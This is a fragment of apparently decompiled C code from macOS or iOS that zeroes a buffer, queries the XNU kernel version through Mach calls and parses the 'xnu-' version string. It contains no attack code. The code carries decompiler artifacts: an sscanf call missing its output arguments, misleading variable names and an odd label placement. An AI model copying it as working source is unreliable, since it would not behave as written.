  host_info[0x31] = '\0';
  host_info[0x32] = '\0';
  host_info[0x33] = '\0';
  host_info[0x34] = '\0';
  host_info[0x35] = '\0';
  host_info[0x36] = '\0';
  host_info[0x37] = '\0';
  host_info[0x48] = '\0';
  host_info[0x49] = '\0';
  host_info[0x4a] = '\0';
  host_info[0x4b] = '\0';
  host_info[0x4c] = '\0';
  host_info[0x4d] = '\0';
  host_info[0x4e] = '\0';
  host_info[0x4f] = '\0';
  host_info[0x40] = '\0';
  host_info[0x41] = '\0';
  host_info[0x42] = '\0';
  host_info[0x43] = '\0';
  host_info[0x44] = '\0';
  host_info[0x45] = '\0';
  host_info[0x46] = '\0';
  host_info[0x47] = '\0';
  host_info[0x18] = '\0';
  host_info[0x19] = '\0';
  host_info[0x1a] = '\0';
  host_info[0x1b] = '\0';
  host_info[0x1c] = '\0';
  host_info[0x1d] = '\0';
  host_info[0x1e] = '\0';
  host_info[0x1f] = '\0';
  host_info[0x10] = '\0';
  host_info[0x11] = '\0';
  host_info[0x12] = '\0';
  host_info[0x13] = '\0';
  host_info[0x14] = '\0';
  host_info[0x15] = '\0';
  host_info[0x16] = '\0';
  host_info[0x17] = '\0';
  host_info[0x28] = '\0';
  host_info[0x29] = '\0';
  host_info[0x2a] = '\0';
  host_info[0x2b] = '\0';
  host_info[0x2c] = '\0';
  host_info[0x2d] = '\0';
  host_info[0x2e] = '\0';
  host_info[0x2f] = '\0';
  host_info[0x20] = '\0';
  host_info[0x21] = '\0';
  host_info[0x22] = '\0';
  host_info[0x23] = '\0';
  host_info[0x24] = '\0';
  host_info[0x25] = '\0';
  host_info[0x26] = '\0';
  host_info[0x27] = '\0';
  host_info[8] = '\0';
  host_info[9] = '\0';
  host_info[10] = '\0';
  host_info[0xb] = '\0';
  host_info[0xc] = '\0';
  host_info[0xd] = '\0';
  host_info[0xe] = '\0';
  host_info[0xf] = '\0';
  host_info[0] = '\0';
  host_info[1] = '\0';
  host_info[2] = '\0';
  host_info[3] = '\0';
  host_info[4] = '\0';
  host_info[5] = '\0';
  host_info[6] = '\0';
  host_info[7] = '\0';
  host = _mach_host_self();
  u = _host_kernel_version(host,host_info);
  if (u == 0) {
fail:
    ptr = _strstr(host_info,"RELEASE");
    if (ptr == (char *)0x0) {
      size = 0xad008;
    }
    else {
      ptr = _strstr(host_info,"xnu-");
      if (ptr != (char *)0x0) {
        bootargs = 0;
        scratch = 0;
        err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
        if (err == 3) {
          size = 0;
          *len = scratch;
          *(uint32_t *)(len + 1) = bootargs;
        }
      }
    }
  }
  else {
    if (u == 0x35) {
      thread_attr[0] = 1;
      thread_attr[1] = 4;
      scratch = 0x200;
      err = _sysctl(thread_attr,2,host_info,&scratch,(void *)0x0,0);
      if (err == 0) goto fail;
    }
    size = u | 0x80000000;
  }
  return size;
}

